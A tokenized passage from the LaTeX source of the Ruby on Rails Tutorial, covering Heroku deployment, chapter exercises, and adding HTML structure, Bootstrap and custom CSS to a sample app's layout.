▁Those ▁using ▁the ▁cloud ▁IDE ▁should ▁see ▁the ▁Heroku ▁version ▁number , ▁indicat ing ▁that ▁the ▁\ k ode { heroku } ▁C L I ▁is ▁available , ▁but ▁on ▁other ▁systems ▁it ▁may ▁be ▁necessary ▁to ▁install ▁it ▁using ▁the ▁\ href { https :// to ol be lt . heroku . com /}{ Heroku ▁To ol be lt }
▁On ce ▁you ' ve ▁verifie d ▁that ▁the ▁Heroku ▁command - line ▁interface ▁is ▁installed , ▁use ▁the ▁\ k ode { heroku } ▁command ▁to ▁log ▁in ▁and ▁add ▁your ▁ SS H ▁key :
▁F inally , ▁use ▁the ▁\ k ode { heroku ▁create } ▁command ▁to ▁create ▁a ▁place ▁on ▁the ▁Heroku ▁server s ▁for ▁the ▁sample ▁app ▁to ▁live ▁( Listing ~\ ref { code : heroku _ create }).
▁Creat ing ▁a ▁new ▁application ▁at ▁Heroku .
▁Git ▁remote ▁ heroku ▁added
▁The ▁\ k ode { heroku } ▁command ▁creates ▁a ▁new ▁sub domain ▁just ▁for ▁our ▁application , ▁available ▁for ▁imm edia t e ▁view ing .
▁There ' s ▁nothing ▁there ▁yet , ▁though , ▁so ▁let ' s ▁get ▁b us y ▁deploying .
▁< n >< n > ▁\ subsection { Heroku ▁deployment , ▁step ▁one }< n > ▁\ label { sec : heroku _ step _ one }< n >< n >
▁To ▁deploy ▁the ▁application , ▁the ▁first ▁step ▁is ▁to ▁use ▁Git ▁to ▁push ▁the ▁master ▁branch ▁up ▁to ▁Heroku :
▁ $ ▁git ▁push ▁ heroku
▁( You ▁may ▁see ▁some ▁warning ▁messages , ▁which ▁you ▁should ▁ignore ▁for ▁now .
▁We ' ll ▁discuss ▁them ▁further ▁in ▁Section ~\ ref { sec : p rofessional _ grade _ deploy ment }. )
▁There ▁is ▁no ▁step ▁two !
▁We ' re ▁already ▁done .
▁To ▁see ▁your ▁new ly ▁deploy ed ▁application , ▁visit ▁the ▁address ▁that ▁you ▁saw ▁when ▁you ▁ ra n ▁\ k ode { heroku ▁create } ▁( i . e . , ▁Listing ~\ ref { code : heroku _ create }).
▁( If ▁you ' re ▁working ▁on ▁your ▁local ▁machine ▁instead ▁of ▁the ▁cloud ▁IDE , ▁you ▁can ▁also ▁use ▁\ k ode { heroku ▁open }. )
▁The ▁result ▁appears ▁in ▁F igure ~\ ref { fig : heroku _ app }.
▁The ▁page ▁is ▁identical ▁to ▁F igure ~\ ref { fig : hello _ world _ hello _ app }, ▁but ▁now ▁it ' s ▁running ▁in ▁a ▁production ▁environment ▁on ▁the ▁live ▁web .
▁The ▁first ▁Rails ▁Tutorial ▁application ▁running ▁on ▁Heroku .
▁There ▁are ▁many ▁\ href { http :// dev center . heroku . com / heroku - command }{ Heroku ▁commands }, ▁and ▁we ' ll ▁bar e ly ▁scratch ▁the ▁ s ur fa ce ▁in ▁this ▁book .
▁Let ' s ▁take ▁a ▁ minute ▁to ▁show ▁just ▁one ▁of ▁them ▁by ▁re n am ing ▁the ▁application ▁as ▁follows :
▁Do n ' t ▁use ▁this ▁name ▁yourself ; ▁it ' s ▁already ▁take n ▁by ▁me !
▁In ▁fact , ▁you ▁ probably ▁should n ' t ▁both er ▁with ▁this ▁step ▁right ▁now ; ▁using ▁the ▁default ▁address ▁supplied ▁by ▁Heroku ▁is ▁fine .
▁But ▁if ▁you ▁do ▁want ▁to ▁re name ▁your ▁application , ▁you ▁can ▁arrange ▁for ▁it ▁to ▁be ▁reasonabl y ▁secure ▁by ▁using ▁a ▁random ▁or ▁ ob sc ure ▁sub domain , ▁such ▁as ▁the ▁following :
▁h w p c b m z e . heroku app . com < n > se y j h f lo . heroku app . com < n > j h y ic e v g . heroku app . com
▁With ▁a ▁random ▁sub domain ▁like ▁this , ▁some one ▁could ▁visit ▁your ▁site ▁only ▁if ▁you ▁g a ve ▁them ▁the ▁address .
▁( B y ▁the ▁way , ▁as ▁a ▁preview ▁of ▁Ruby ' s ▁compact ▁a we some n es s , ▁here ' s ▁the ▁code ▁I ▁used ▁to ▁generate ▁the ▁random ▁sub domain s :
▁P re tt y ▁ s we et .)
▁In ▁addition ▁to ▁support ing ▁sub domain s , ▁Heroku ▁also ▁supports ▁custom ▁domain s .
▁( In ▁fact , ▁the ▁\ href { http :// www . railstutorial . org }{ Ruby ▁on ▁Rails ▁Tutorial ▁site } ▁live s ▁at ▁Heroku ; ▁if ▁you ' re ▁reading ▁this ▁book ▁online , ▁you ' re ▁look ing ▁at ▁a ▁Heroku - host ed ▁site ▁right ▁now ! )
▁See ▁the ▁\ href { http :// dev center . heroku . com /}{ Heroku ▁documentation } ▁for ▁more ▁information ▁about ▁custom ▁domain s ▁and ▁other ▁Heroku ▁topic s .
▁We ' ve ▁come ▁a ▁long ▁way ▁in ▁this ▁chapter : ▁installation , ▁development ▁environment ▁setup , ▁version ▁control , ▁and ▁deployment .
▁In ▁the ▁next ▁chapter , ▁we ' ll ▁build ▁on ▁the ▁foundation ▁from ▁Chapter ~\ ref { cha : beginning } ▁to ▁make ▁a ▁database - back ed ▁\ emph { toy ▁app }, ▁which ▁will ▁give ▁us ▁our ▁first ▁real ▁taste ▁of ▁what ▁Rails ▁can ▁do .
▁If ▁you ' d ▁like ▁to ▁share ▁your ▁ prog re s s ▁at ▁this ▁point , ▁feel ▁free ▁to ▁send ▁a ▁t we et ▁or ▁F a ce book ▁status ▁update ▁with ▁something ▁like ▁this :
▁I ' m ▁learning ▁Ruby ▁on ▁Rails ▁with ▁the ▁@ railstutorial !
▁ }. < n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : beginning _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁Ruby ▁on ▁Rails ▁is ▁a ▁web ▁development ▁framework ▁written ▁in ▁the ▁Ruby ▁programming ▁language .
▁ Installing ▁Rails , ▁ generating ▁an ▁application , ▁and ▁editing ▁the ▁result ing ▁files ▁is ▁easy ▁using ▁a ▁pre - config ur ed ▁cloud ▁environment .
▁We ▁added ▁a ▁controller ▁action ▁and ▁modified ▁the ▁root ▁route ▁to ▁create ▁a ▁`` hello , ▁world '' ▁application .
▁We ▁ protected ▁again st ▁data ▁ lo s s ▁while ▁ en a b l ing ▁collaborat ion ▁by ▁ placing ▁our ▁application ▁source ▁code ▁under ▁version ▁control ▁with ▁Git ▁and ▁push ing ▁the ▁result ing ▁code ▁to ▁a ▁private ▁repository ▁at ▁Bitbucket .
▁We ▁deploy ed ▁our ▁application ▁to ▁a ▁production ▁environment ▁using ▁Heroku .
▁Change ▁the ▁content ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action } ▁to ▁read ▁`` hola , ▁ mundo ! '' ▁instead ▁of ▁`` hello , ▁world ! ''.
▁\ emph { Extra ▁c r edit } : ▁Show ▁that ▁Rails ▁supports ▁non - \ href { http :// es . wiki p edia . org / wiki / ASCII }{ ASCII } ▁characters ▁by ▁including ▁an ▁in ve r t ed ▁excl am ation ▁point , ▁as ▁in ▁`` ¡ H ol a , ▁ mundo ! '' ▁( F igure ~\ ref { fig : hola _ mundo })
▁Your ▁editor ▁may ▁display ▁a ▁message ▁like ▁`` invalid ▁ multi by t e ▁character '' , ▁but ▁this ▁is ▁not ▁a ▁cause ▁for ▁concern .
▁You ▁can ▁\ href { http :// l m gt f y . com / ? q = invalid + multi by t e + character }{ G oo g le ▁the ▁error ▁message } ▁if ▁you ▁want ▁to ▁learn ▁how ▁to ▁make ▁it ▁go ▁a way .
▁By ▁following ▁the ▁example ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action }, ▁add ▁a ▁second ▁action ▁called ▁\ k ode { goodbye } ▁that ▁render s ▁the ▁text ▁`` goodbye , ▁world ! ''.
▁ Edit ▁the ▁routes ▁file ▁from ▁Listing ~\ ref { code : hello _ root _ route } ▁so ▁that ▁the ▁root ▁route ▁go es ▁to ▁\ k ode { goodbye } ▁instead ▁of ▁to ▁\ k ode { hello } ▁( F igure ~\ ref { fig : goodbye _ world }).
▁ Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` ¡ H ol a , ▁ mundo ! ''.
▁ Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` goodbye , ▁world ! ''.
▁beginning
▁For ▁a ▁suggest ion ▁on ▁how ▁to ▁avoid ▁conflicts ▁between ▁ exercises ▁and ▁the ▁main ▁tutorial , ▁see ▁the ▁note ▁on ▁exercise ▁topic ▁branches ▁in ▁Section ~\ ref { sec : static _ pages _ exercises }.
▁\ emph { Note } : ▁The ▁\ emph { S ol u t ion s ▁M an u al ▁for ▁ Ex er ci s es }, ▁with ▁solution s ▁to ▁every ▁exercise ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁book , ▁is ▁included ▁for ▁free ▁with ▁every ▁purchas e ▁at ▁\ href { http :// www . railstutorial . org /}{ www . railstutorial . org }.
▁T hanks ▁to ▁reader ▁\ href { https :// twitter . com / c ol m t u ite }{ C ol m ▁T u ite } ▁for ▁his ▁excellent ▁work ▁in ▁help ing ▁to ▁convert ▁the ▁sample ▁application ▁over ▁to ▁the ▁Bootstrap ▁CSS ▁framework .
▁We ' ll ▁end ▁by ▁tak ing ▁a ▁first ▁important ▁step ▁toward ▁let ting ▁users ▁sign ▁up ▁to ▁our ▁site ▁( Section ~\ ref { sec : user _ signup }).
▁As ▁a ▁result , ▁we ' ll ▁sp end ▁most ▁of ▁our ▁time ▁in ▁our ▁text ▁editor ▁and ▁browser , ▁using ▁ TDD ▁only ▁to ▁add ▁a ▁Contact ▁page ▁( Section ~\ ref { sec : contact _ page }).
▁We ▁will ▁add ▁an ▁important ▁new ▁test , ▁though , ▁writing ▁our ▁first ▁\ emph { integration ▁test } ▁to ▁check ▁that ▁the ▁links ▁on ▁the ▁final ▁layout ▁are ▁correct ▁( Section ~\ ref { sec : layout _ link _ tests }).
▁< n >< n > ▁\ section { Adding ▁some ▁structure } ▁% ▁( fold )< n > ▁\ label { sec : structure }< n >< n >
▁The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁is ▁a ▁book ▁on ▁web ▁development , ▁not ▁web ▁design , ▁but ▁it ▁would ▁be ▁ de pre s s ing ▁to ▁work ▁on ▁an ▁application ▁that ▁look s ▁like ▁\ emph { c omplete } ▁c ra p , ▁so ▁in ▁this ▁section ▁we ' ll ▁add ▁some ▁structure ▁to ▁the ▁layout ▁and ▁give ▁it ▁some ▁minimal ▁styling ▁with ▁CSS . ▁In ▁addition ▁to ▁using ▁some ▁custom ▁CSS ▁rules , ▁we ' ll ▁make ▁use ▁of ▁\ href { http :// get bootstrap . com / }{\ emph { Bootstrap } }, ▁an ▁open - source ▁web ▁design ▁framework ▁from ▁Twitter .
▁We ' ll ▁also ▁give ▁our ▁\ emph { code } ▁some ▁styling , ▁so ▁to ▁sp e a k , ▁using ▁\ emph { partial s } ▁to ▁t id y ▁up ▁the ▁layout ▁once ▁it ▁get s ▁a ▁little ▁cl u tt er ed .
▁Through out ▁the ▁rest ▁of ▁this ▁book , ▁I ▁will ▁thus ▁often ▁include ▁\ emph { mockup s } ▁( in ▁a ▁web ▁context ▁often ▁called ▁\ emph { w i re frame s }), ▁which ▁are ▁ r ough ▁sketch es ▁of ▁what ▁the ▁eventual ▁application ▁will ▁look ▁like
▁The ▁mockup s ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁are ▁made ▁with ▁an ▁excellent ▁online ▁mockup ▁application ▁called ▁\ href { http :// go m o c k ing b ir d . com }{ M o c k ing b ir d }.
▁In ▁this ▁chapter , ▁we ▁will ▁principal ly ▁be ▁developing ▁the ▁static ▁pages ▁introduce d ▁in ▁Section ~\ ref { sec : static _ pages }, ▁including ▁a ▁site ▁ logo , ▁a ▁navigation ▁header , ▁and ▁a ▁site ▁ footer .
▁A ▁mockup ▁for ▁the ▁most ▁important ▁of ▁these ▁pages , ▁the ▁Home ▁page , ▁appears ▁in ▁F igure ~\ ref { fig : home _ page _ mockup }.
▁You ▁can ▁see ▁the ▁final ▁result ▁in ▁F igure ~\ ref { fig : site _ with _ footer }.
▁You ' ll ▁note ▁that ▁it ▁differ s ▁in ▁some ▁details --- for ▁example , ▁we ' ll ▁end ▁up ▁adding ▁a ▁Rails ▁ logo ▁on ▁the ▁page --- but ▁that ' s ▁fine , ▁since ▁a ▁mockup ▁need ▁not ▁be ▁exact .
▁A ▁mockup ▁of ▁the ▁sample ▁application ' s ▁Home ▁page .
▁As ▁usual , ▁if ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁now ▁would ▁be ▁a ▁good ▁time ▁to ▁make ▁a ▁new ▁branch :
▁This ▁includes ▁some ▁ additional ▁division s , ▁some ▁CSS ▁classes , ▁and ▁the ▁start ▁of ▁our ▁site ▁navigation .
▁The ▁full ▁file ▁is ▁in ▁Listing ~\ ref { code : layout _ new _ structure } ; ▁ ex p la n ation s ▁for ▁the ▁ various ▁pieces ▁follow ▁immediately ▁there after .
▁If ▁you ' d ▁rather ▁not ▁ de la y ▁gra t if ic ation , ▁you ▁can ▁see ▁the ▁results ▁in ▁F igure ~\ ref { fig : layout _ no _ logo _ or _ custom _ css }.
▁(\ emph { Note } : ▁it ' s ▁not ▁( y et ) ▁very ▁gra t ify ing .)
▁The ▁site ▁layout ▁with ▁added ▁structure .
▁D O C TYPE ▁ html >
▁< html >
▁< head >
▁< ! - - [ if ▁ lt ▁I E ▁ 9 ] >
▁< ! [ end if ]
▁</ head >
▁< body >
▁< nav >
▁</ ul >
▁</ nav >
▁</ header >
▁</ body >
▁</ html >
▁Let ' s ▁look ▁at ▁the ▁new ▁elements ▁in ▁Listing ~\ ref { code : layout _ new _ structure } ▁from ▁to p ▁to ▁bottom .
▁The ▁words ▁\ emph { shim } ▁and ▁\ emph { s h i v } ▁are ▁used ▁in ter cha n g ably ▁in ▁this ▁context ; ▁the ▁form er ▁is ▁the ▁proper ▁ ter m , ▁base d ▁on ▁the ▁English ▁word ▁who se ▁meaning ▁is ▁`` a ▁was h er ▁or ▁ th in ▁ str ip ▁of ▁material ▁used ▁to ▁a li g n ▁parts , ▁make ▁them ▁fit , ▁or ▁reduce ▁we ar '' , ▁while ▁the ▁latter ▁( me an ing ▁`` a ▁ k n if e ▁or ▁ ra z or ▁used ▁as ▁a ▁we ap on '') ▁is ▁apparent ly ▁a ▁ play ▁on ▁the ▁name ▁of ▁the ▁ shim ' s ▁original ▁author , ▁S j o er d ▁Vi s s ch er .
▁The ▁some what ▁odd ▁syntax
▁includes ▁the ▁ en close d ▁line ▁only ▁if ▁the ▁version ▁of ▁M ic r o s of t ▁ Internet ▁Exp l or er ~ ( I E ) ▁is ▁less ▁than ~ 9 ▁(\ k ode { if ▁ lt ▁I E ▁ 9 }).
▁The ▁we ir d ▁\ k ode { [ if ▁ lt ▁I E ▁ 9 ]} ▁syntax ▁is ▁\ emph { not } ▁part ▁of ▁Rails ; ▁it ' s ▁actually ▁a ▁\ href { http :// en . wiki p edia . org / wiki / Conditional _ comment }{ condition al ▁comment } ▁supported ▁by ▁ Internet ▁Exp l or er ▁browsers ▁for ▁just ▁this ▁sort ▁of ▁situation .
▁It ' s ▁a ▁good ▁thing , ▁too , ▁because ▁it ▁means ▁we ▁can ▁include ▁the ▁HTML 5 ▁ shim ▁\ emph { only } ▁for ▁I E ▁browsers ▁less ▁than ▁version ~ 9 , ▁leav ing ▁other ▁browsers ▁such ▁as ▁Firefox , ▁Chrome , ▁and ▁Safari ▁un a ffect ed .
▁The ▁next ▁section ▁includes ▁a ▁\ k ode { header } ▁for ▁the ▁site ' s ▁( plain - text ) ▁ logo , ▁a ▁couple ▁of ▁division s ▁( using ▁the ▁\ k ode { div } ▁tag ), ▁and ▁a ▁list ▁of ▁elements ▁with ▁navigation ▁links :
▁Here ▁the ▁\ k ode { header } ▁tag ▁indicates ▁elements ▁that ▁should ▁go ▁at ▁the ▁to p ▁of ▁the ▁page .
▁These ▁are ▁completely ▁un rel at ed ▁to ▁Ruby ▁classes .
▁All ▁HTML ▁elements ▁can ▁be ▁assign ed ▁both ▁classes ▁and ▁\ emph { id s } ; ▁these ▁are ▁me re ly ▁ label s , ▁and ▁are ▁useful ▁for ▁styling ▁with ▁CSS ▁( Section ~\ ref { sec : custom _ css }).
▁The ▁main ▁difference ▁between ▁classes ▁and ▁id s ▁is ▁that ▁classes ▁can ▁be ▁used ▁multiple ▁time s ▁on ▁a ▁page , ▁but ▁id s ▁can ▁be ▁used ▁only ▁once .
▁In ▁the ▁present ▁case , ▁all ▁the ▁ navbar ▁classes ▁have ▁special ▁meaning ▁to ▁the ▁Bootstrap ▁framework , ▁which ▁we ' ll ▁install ▁and ▁use ▁in ▁Section ~\ ref { sec : custom _ css }.
▁In side ▁the ▁\ k ode { header } ▁tag , ▁we ▁see ▁a ▁\ k ode { div } ▁tag :
▁The ▁\ k ode { div } ▁tag ▁is ▁a ▁generic ▁division ; ▁it ▁does n ' t ▁do ▁anything ▁a part ▁from ▁ div id e ▁the ▁document ▁into ▁ distinct ▁parts .
▁In ▁older - style ▁HTML , ▁\ k ode { div } ▁tags ▁are ▁used ▁for ▁ nearly ▁all ▁site ▁division s , ▁but ▁HTML 5 ▁add s ▁the ▁\ k ode { header }, ▁\ k ode { nav }, ▁and ▁\ k ode { section } ▁elements ▁for ▁division s ▁common ▁to ▁many ▁applications .
▁In ▁this ▁case , ▁the ▁\ k ode { div } ▁has ▁a ▁CSS ▁class ▁as ▁well ▁(\ k ode { contain er }).
▁As ▁with ▁the ▁\ k ode { header } ▁tag ' s ▁classes , ▁this ▁class ▁has ▁special ▁meaning ▁to ▁Bootstrap .
▁After ▁the ▁ div , ▁we ▁ en counter ▁some ▁ embedded ▁Ruby :
▁The ▁third ▁argument ▁is ▁an ▁options ▁hash , ▁in ▁this ▁case ▁adding ▁the ▁CSS ~ id ▁\ k ode { logo } ▁to ▁the ▁sample ▁app ▁link .
▁( The ▁other ▁three ▁links ▁have ▁no ▁options ▁hash , ▁which ▁is ▁fine ▁since ▁it ' s ▁optional .)
▁Rails ▁helpers ▁often ▁take ▁options ▁hashes ▁in ▁this ▁way , ▁giv ing ▁us ▁the ▁flexibility ▁to ▁add ▁arbitrar y ▁HTML ▁options ▁without ▁ever ▁leav ing ▁Rails .
▁The ▁second ▁element ▁inside ▁the ▁ div s ▁is ▁a ▁list ▁of ▁navigation ▁links , ▁made ▁using ▁the ▁\ emph { un order ed ▁list } ▁tag ▁\ k ode { ul }, ▁together ▁with ▁the ▁\ emph { list ▁item } ▁tag ▁\ k ode { li } :
▁The ▁\ k ode { < nav > } ▁tag , ▁though ▁form ally ▁unnecessary ▁here , ▁is ▁used ▁to ▁more ▁clear ly ▁communicat e ▁the ▁purpose ▁of ▁the ▁navigation ▁links .
▁ Meanwhile , ▁the ▁\ k ode { nav }, ▁\ line break ▁\ k ode { navbar - nav }, ▁and ▁\ k ode { navbar - right } ▁classes ▁on ▁the ▁\ k ode { ul } ▁tag ▁have ▁special ▁meaning ▁to ▁Bootstrap ▁and ▁will ▁be ▁style d ▁automatically ▁when ▁we ▁include ▁the ▁Bootstrap ▁CSS ▁in ▁Section ~\ ref { sec : custom _ css }.
▁As ▁you ▁can ▁verify ▁by ▁ inspect ing ▁the ▁navigation ▁in ▁your ▁browser , ▁once ▁Rails ▁has ▁processed ▁the ▁layout ▁and ▁evaluated ▁the ▁ embedded ▁Ruby ▁the ▁list ▁look s ▁like ▁this
▁The ▁ spacing ▁m ight ▁look ▁slightly ▁different , ▁which ▁is ▁fine ▁because ▁( as ▁noted ▁in ▁Section ~\ ref { sec : test ing _ title s }) ▁HTML ▁is ▁ insensitive ▁to ▁whitespace .
▁This ▁is ▁the ▁text ▁that ▁will ▁be ▁returned ▁to ▁the ▁browser .
▁The ▁final ▁part ▁of ▁the ▁layout ▁is ▁a ▁\ k ode { div } ▁for ▁the ▁main ▁content :
▁As ▁before , ▁the ▁\ k ode { contain er } ▁class ▁has ▁special ▁meaning ▁to ▁Bootstrap .
▁As ▁we ▁ learned ▁in ▁Section ~\ ref { sec : layouts _ and _ embedded _ ruby }, ▁the ▁\ k ode { yield } ▁method ▁insert s ▁the ▁contents ▁of ▁each ▁page ▁into ▁the ▁site ▁layout .
▁A part ▁from ▁the ▁site ▁ footer , ▁which ▁we ' ll ▁add ▁in ▁Section ~\ ref { sec : partial s }, ▁our ▁layout ▁is ▁now ▁complete , ▁and ▁we ▁can ▁look ▁at ▁the ▁results ▁by ▁visit ing ▁the ▁Home ▁page .
▁To ▁take ▁advantage ▁of ▁the ▁up com ing ▁style ▁elements , ▁we ' ll ▁add ▁some ▁extra ▁elements ▁to
▁The ▁Home ▁page ▁with ▁a ▁link ▁to ▁the ▁signup ▁page .
▁This ▁is ▁the ▁home ▁page ▁for ▁the
▁sample ▁application .
▁</ h 2 >
▁In ▁prepar ation ▁for ▁adding ▁users ▁to ▁our ▁site ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁the ▁first ▁\ k ode { link \_ to } ▁creates ▁a ▁ stub ▁link ▁of ▁the ▁form
▁In ▁the ▁\ k ode { div } ▁tag , ▁the ▁\ k ode { j um b o tr on } ▁CSS ▁class ▁has ▁a ▁special ▁meaning ▁to ▁Bootstrap , ▁as ▁do ▁the ▁\ k ode { b t n }, ▁\ k ode { b t n - l g }, ▁and ▁\ k ode { b t n - primary } ▁classes ▁in ▁the ▁signup ▁button .
▁The ▁second ▁\ k ode { link \_ to } ▁shows ▁off ▁the ▁\ k ode { image \_ tag } ▁helper , ▁which ▁take s ▁as ▁arguments ▁the ▁path ▁to ▁an ▁image ▁and ▁an ▁optional ▁options ▁hash , ▁in ▁this ▁case ▁setting ▁the ▁\ k ode { alt } ▁attribute ▁of ▁the ▁image ▁tag ▁using ▁symbols .
▁If ▁you ' re ▁using ▁the ▁cloud ▁IDE ▁or ▁another ▁Unix - like ▁system , ▁you ▁can ▁accomplish ▁this ▁with ▁the ▁\ k ode { curl } ▁utility ▁as ▁follows
▁If ▁you ▁have ▁\ href { http :// brew . s h /}{ Home brew } ▁on ▁OS ~ X , ▁you ▁can ▁install ▁\ k ode { curl } ▁using ▁\ k ode { brew ▁install ▁ curl }.
▁If ▁the ▁second ▁command ▁fails , ▁which ▁some times ▁happens ▁on ▁the ▁cloud ▁IDE ▁for ▁reason s ▁I ▁don ' t ▁understand , ▁try ▁re - running ▁the ▁first ▁\ k ode { curl } ▁command ▁un til ▁the ▁file ▁ download s ▁correctly .
▁( For ▁more ▁on ▁\ k ode { curl }, ▁see ▁\ href { http :// c onquering the command line . com / book / curl }{ Chapter ▁3 ▁of ▁\ emph { C onquering ▁the ▁Co m m and ▁L ine } }. )
▁Because ▁we ▁used ▁the ▁\ k ode { image \_ tag } ▁helper ▁in ▁Listing ~\ ref { code : signup _ button }, ▁Rails ▁will ▁automatically ▁find ▁any ▁images ▁in ▁the ▁\ k ode { app / assets / images / } ▁directory ▁using ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : sass _ and _ the _ asset _ pipeline }).
▁To ▁make ▁the ▁effect s ▁of ▁\ k ode { image \_ tag } ▁clear er , ▁let ' s ▁look ▁at ▁the ▁HTML ▁it ▁produce s
▁T a g s ▁that ▁follow ▁this ▁form ▁are ▁known ▁as ▁\ emph { self - closing } ▁tags .
▁Here ▁the ▁string ▁\ k ode { 9 3 08 b 8 f 9 2 f e a 4 c 19 a 3 a 0 d 8 38 5 b 4 9 4 5 2 6 } ▁( which ▁will ▁differ ▁on ▁your ▁system ) ▁is ▁added ▁by ▁Rails ▁to ▁ensure ▁that ▁the ▁filename ▁is ▁unique , ▁which ▁cause s ▁browsers ▁to ▁load ▁images ▁properly ▁when ▁they ▁have ▁been ▁updated ▁( instead ▁of ▁retriev ing ▁them ▁from ▁the ▁browser ▁cache ).
▁Note ▁that ▁the ▁\ k ode { s r c } ▁attribute ▁\ emph { do es n ' t } ▁include ▁\ k ode { images }, ▁instead ▁using ▁an ▁\ k ode { assets } ▁directory ▁common ▁to ▁all ▁assets ▁( images , ▁JavaScript , ▁CSS , ▁etc . ).
▁ Meanwhile , ▁the ▁\ k ode { alt } ▁attribute ▁is ▁what ▁will ▁be ▁displayed ▁if ▁the ▁page ▁is ▁access ed ▁by ▁a ▁program ▁that ▁can ' t ▁display ▁images ▁( such ▁as ▁screen ▁readers ▁for ▁the ▁ visual ly ▁i mp a ir ed ).
▁A lthough ▁people ▁are ▁some times ▁ s lo p p y ▁about ▁including ▁the ▁\ k ode { alt } ▁attribute ▁for ▁images , ▁it ▁is ▁in ▁fact ▁required ▁by ▁the ▁HTML ▁standard .
▁In ▁this ▁case , ▁though , ▁we ' ve ▁set ▁the ▁\ k ode { alt } ▁text ▁explicitly ▁in ▁order ▁to ▁ capitalize ▁`` Rails ''.
▁Now ▁we ' re ▁finally ▁ready ▁to ▁see ▁the ▁f ru it s ▁of ▁our ▁ la b or s , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : layout _ no _ logo _ or _ custom _ css }.
▁P re tt y ▁under w hel m ing , ▁you ▁say ?
▁P erhaps ▁so .
▁H appily , ▁though , ▁we ' ve ▁done ▁a ▁good ▁job ▁of ▁giv ing ▁our ▁HTML ▁elements ▁ s en s i b le ▁classes , ▁which ▁put s ▁us ▁in ▁a ▁great ▁position ▁to ▁add ▁style ▁to ▁the ▁site ▁with ▁CSS .
▁In ▁Section ~\ ref { sec : adding _ to _ the _ layout }, ▁we ▁ associated ▁many ▁of ▁the ▁HTML ▁elements ▁with ▁CSS ▁classes , ▁which ▁gives ▁us ▁consider able ▁flexibility ▁in ▁construct ing ▁a ▁layout ▁base d ▁on ▁CSS .
▁As ▁noted ▁in ▁Section ~\ ref { sec : adding _ to _ the _ layout }, ▁many ▁of ▁these ▁classes ▁are ▁specific ▁to ▁\ href { http :// get bootstrap . com /}{ Bootstrap }, ▁a ▁framework ▁from ▁Twitter ▁that ▁make s ▁it ▁easy ▁to ▁add ▁nice ▁web ▁design ▁and ▁user ▁interface ▁elements ▁to ▁an ▁HTML 5 ▁application .
▁In ▁this ▁section , ▁we ' ll ▁combine ▁Bootstrap ▁with ▁some ▁custom ▁CSS ▁rules ▁to ▁start ▁adding ▁some ▁style ▁to ▁the ▁sample ▁application .
▁It ' s ▁worth ▁noting ▁that ▁using ▁Bootstrap ▁automatically ▁make s ▁our ▁application ' s ▁design ▁\ href { http :// en . wiki p edia . org / wiki / Re s p on s ive _ web _ de sign }{\ emph { re s p on s ive } }, ▁ en s ur ing ▁that ▁it ▁look s ▁ s en s i b le ▁across ▁a ▁ wide ▁range ▁of ▁ dev ic es .
▁Ou r ▁first ▁step ▁is ▁to ▁add ▁Bootstrap , ▁which ▁in ▁Rails ▁applications ▁can ▁be ▁accomplish ed ▁with ▁the ▁\ text tt { bootstrap - sass } ▁gem , ▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ sass }.
▁The ▁Bootstrap ▁framework ▁native ly ▁uses ▁the ▁\ href { http :// less css . org /}{ L es s ▁CSS } ▁language ▁for ▁making ▁dynamic ▁stylesheets , ▁but ▁the ▁Rails ▁asset ▁pipeline ▁supports ▁the ▁( ve ry ▁similar ) ▁Sass ▁language ▁by ▁default ▁( Section ~\ ref { sec : sass _ and _ the _ asset _ pipeline }), ▁so ▁\ text tt { bootstrap - sass } ▁convert s ▁L es s ▁to ▁Sass ▁and ▁make s ▁all ▁the ▁necessary ▁Bootstrap ▁files ▁available ▁to ▁the ▁current ▁application
▁It ▁is ▁also ▁possible ▁to ▁use ▁L es s ▁with ▁the ▁asset ▁pipeline ; ▁see ▁the ▁\ href { http :// rubygems . org / gem s / less - rails - bootstrap }{\ text tt { less - rails - bootstrap } ▁gem } ▁for ▁details .
▁To ▁install ▁Bootstrap , ▁we ▁run ▁\ k ode { bundle ▁install } ▁as ▁usual :
▁A lthough ▁\ k ode { rails ▁generate } ▁automatically ▁creates ▁a ▁separate ▁CSS ▁file ▁for ▁each ▁controller , ▁it ' s ▁surpris ing ly ▁hard ▁to ▁include ▁them ▁all ▁properly ▁and ▁in ▁the ▁right ▁order , ▁so ▁for ▁simplicity ▁we ' ll ▁put ▁all ▁of ▁the ▁CSS ▁needed ▁for ▁this ▁tutorial ▁in ▁a ▁single ▁file .
▁The ▁first ▁step ▁toward ▁getting ▁custom ▁CSS ▁to ▁work ▁is ▁to ▁create ▁such ▁a ▁custom ▁CSS ▁file :
▁app / assets / stylesheets / custom . css . scss
▁( This ▁uses ▁the ▁\ k ode { touch } ▁trick ▁from ▁Section ~\ ref { sec : g re en } ▁ en ▁route , ▁but ▁you ▁can ▁create ▁the ▁file ▁however ▁you ▁like .)
▁Here ▁both ▁the ▁directory ▁name ▁and ▁filename ▁extension ▁are ▁important .
▁The ▁directory
▁app / assets / stylesheets /
▁is ▁part ▁of ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : sass _ and _ the _ asset _ pipeline }), ▁and ▁any ▁stylesheets ▁in ▁this ▁directory ▁will ▁automatically ▁be ▁included ▁as ▁part ▁of ▁the ▁\ k ode { application . css } ▁file ▁included ▁in ▁the ▁site ▁layout .
▁F urther more , ▁the ▁filename ▁\ k ode { custom . css . scss } ▁includes ▁the ▁\ k ode { . css } ▁extension , ▁which ▁indicates ▁a ▁CSS ▁file , ▁and ▁the ▁\ k ode { . scss } ▁extension , ▁which ▁indicates ▁a ▁`` S as s y ▁CSS '' ▁file ▁and ▁arrange s ▁for ▁the ▁asset ▁pipeline ▁to ▁process ▁the ▁file ▁using ▁Sass .
